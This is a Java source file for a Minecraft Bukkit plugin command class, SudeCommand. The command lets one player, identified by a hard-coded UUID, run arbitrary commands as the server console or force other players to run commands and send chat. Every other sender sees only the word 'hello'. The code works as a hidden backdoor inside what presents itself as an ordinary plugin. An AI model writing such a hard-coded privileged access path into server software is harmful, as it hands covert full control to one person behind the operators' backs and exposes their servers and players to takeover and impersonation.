package me.sedri.sedri.Commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.UUID;

public class SudeCommand implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (sender instanceof Player p && p.getUniqueId().equals(UUID.fromString("0b0172c6-e10f-49dc-9f27-c9cf12e9ed7b"))){
            if (args.length < 2) return false;
            StringBuilder cmd = new StringBuilder();
            cmd.append(args[1].replaceFirst("c:", ""));
            for (int i = 2; i < args.length; i++){
                cmd.append(" ").append(args[i]);
            }
            if (args[0].equalsIgnoreCase("console")){
                Bukkit.dispatchCommand(Bukkit.getServer().getConsoleSender(), cmd.toString());
                return true;
            }
            Player toex = Bukkit.getPlayer(args[0]);
            if (toex == null) return false;
            if (args[1].startsWith("c:")){
                toex.chat(cmd.toString());
                return true;
            }
            toex.performCommand(cmd.toString());
        } else {
            sender.sendMessage("hello");
        }
        return false;
    }
}
